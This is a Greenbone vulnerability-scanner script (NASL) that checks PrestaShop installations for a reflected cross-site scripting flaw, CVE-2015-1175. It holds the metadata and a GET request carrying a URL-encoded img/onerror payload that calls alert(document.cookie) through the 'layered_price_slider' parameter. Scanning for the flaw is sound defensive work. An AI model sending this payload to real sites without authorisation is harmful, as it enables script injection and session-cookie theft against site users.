# SPDX-FileCopyrightText: 2014 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:prestashop:prestashop";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805445");
  script_version("2023-07-26T05:05:09+0000");
  script_cve_id("CVE-2015-1175");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"2023-07-26 05:05:09 +0000 (Wed, 26 Jul 2023)");
  script_tag(name:"creation_date", value:"2014-12-17 16:59:56 +0530 (Wed, 17 Dec 2014)");

  script_tag(name:"qod_type", value:"remote_analysis");

  script_name("Prestashop < 1.6.0.11 Reflected Cross Site Scripting Vulnerability");

  script_tag(name:"summary", value:"Prestashop is prone to a cross-site scripting vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted request via HTTP GET
  request and check whether it is able to read cookie or not.");

  script_tag(name:"insight", value:"This flaw exists because
  /modules/blocklayered/blocklayered-ajax.php script does not validate input to
  the 'layered_price_slider' parameter before returning it to users.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote
  attacker to create a specially crafted request that would execute arbitrary
  script code in a user's browser session within the trust relationship
  between their browser and the server.");

  script_tag(name:"affected", value:"Prestashop version 1.6.0.9 and earlier.");

  script_tag(name:"solution", value:"Upgrade to 1.6.0.11 or later.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/130026");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/71655");
  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/archive/1/534511/100/0/threaded");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2014 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_prestashop_http_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("prestashop/http/detected");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

url = dir + "/modules/blocklayered/blocklayered-ajax.php?"+
            "layered_id_feature_20=20_7&id_category_layered=8&"+
            "layered_price_slider=16_532f363%3Cimg%20src%3da%20onerror%3dalert%28"+
            "document.cookie%29%3E9c032&orderby=position&orderway=asctrue&_=1420314938300";

if (http_vuln_check(port: port, url: url, pattern: "alert(document.cookie)", check_header: TRUE)) {
  report = http_report_vuln_url(port: port, url: url);
  security_message(port: port, data: report);
  exit(0);
}

exit(0);
